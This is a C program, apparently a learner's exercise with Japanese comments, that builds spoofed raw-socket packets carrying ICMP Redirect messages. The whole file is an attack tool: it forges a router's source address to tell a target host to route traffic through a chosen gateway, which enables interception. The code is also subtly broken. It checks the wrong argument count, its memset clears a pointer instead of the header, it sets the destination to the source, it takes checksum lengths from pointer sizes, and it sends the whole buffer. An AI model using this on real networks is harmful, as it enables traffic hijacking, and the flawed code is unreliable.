#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>

void die(char *msg);
void make_udp_header(struct udphdr * udp);
void make_ip_header(struct ip *ip, int target_ip, int dest_ip, int proto, int iplen);
void make_icmp5_header(struct icmp *icmp, u_int32_t gw_ip);
u_int16_t checksum(u_int16_t *data, int len);

enum {
    CMD_NAME,
    TARGET_IP,
    OLD_ROUTER,
    NEW_ROUTER,
    DEST_IP 
};

int main(int argc, char **argv) {
    puts("redirect");

    if (argc != 5) {
        die("input error");
    }

    int s;
    int on = 1;
    unsigned char buf[1500];
    struct udphdr *udp;
    struct ip *old_ip;
    struct icmp *icmp;
    struct ip *new_ip;
    int size;
    struct sockaddr_in dest;

    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        die("socket");
    }

    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        die("setsockopt");
    }

    new_ip = (struct ip*) buf;
    icmp = (struct icmp*) (buf + 20);
    old_ip = (struct ip*) (buf + 20 + 8);
    udp = (struct udphdr*) (buf + 20 + 8 + 20);
    size = 20 + 8 + 20 + 8;

    // パケットの作成
    make_udp_header(udp);
    make_ip_header(old_ip, inet_addr(argv[TARGET_IP]), inet_addr(argv[DEST_IP]), IPPROTO_UDP, 100);
    make_icmp5_header(icmp, inet_addr(argv[NEW_ROUTER]));
    make_ip_header(new_ip, inet_addr(argv[OLD_ROUTER]), inet_addr(argv[TARGET_IP]), IPPROTO_ICMP, size);

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(argv[DEST_IP]);
    if (sendto(s, buf, sizeof(buf), 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
        die("sendto");
    }

    close(s);
}

void make_udp_header(struct udphdr * udp) {
    udp->uh_sport = htons(2000);
    udp->uh_dport = htons(33434);
    udp->uh_ulen = htons(72); // なんでこの値を入れるのかがわからん。
    udp->uh_sum = htons(9999);
}

void make_ip_header(struct ip *ip, int target_ip, int dest_ip, int proto, int iplen) {
    memset(&ip, 0, sizeof(ip)); // ここでは初期化して他ではしない理由がわからん。

    ip->ip_v = IPVERSION; // 4 が入ってる。
    ip->ip_hl = sizeof(struct ip) >> 2;
    ip->ip_id = htons(0);
    ip->ip_off = 0;

    ip->ip_len = htons(iplen);
    ip->ip_ttl = 10;
    ip->ip_p = proto;
    ip->ip_src.s_addr = target_ip;
    ip->ip_dst.s_addr = target_ip;

    ip->ip_sum = 0;
    ip->ip_sum = checksum((uint16_t *)ip, sizeof(ip));
}

void make_icmp5_header(struct icmp *icmp, u_int32_t gw_ip) {
    icmp->icmp_type = ICMP_REDIRECT;
    icmp->icmp_code = ICMP_REDIR_HOST;
    icmp->icmp_gwaddr.s_addr = gw_ip;
    icmp->icmp_cksum = 0;
    icmp->icmp_cksum = checksum((uint16_t *)icmp, 8 + 20 + 8);
}

u_int16_t checksum(u_int16_t *data, int len) {
    u_int32_t sum = 0;

    for (; len > 1; len -= 2) {
        sum += *data++;

        if (sum & 0x80000000) {
            sum = (sum & 0xffff) + (sum >> 16);
        }
    }

    if (len == 1) {
        u_int16_t i = 0;
        *(u_char *) (&i) = *(u_char *) data;
        sum += i;
    }

    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (sum == 0xffff) ? sum : ~sum;
}

void die(char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}
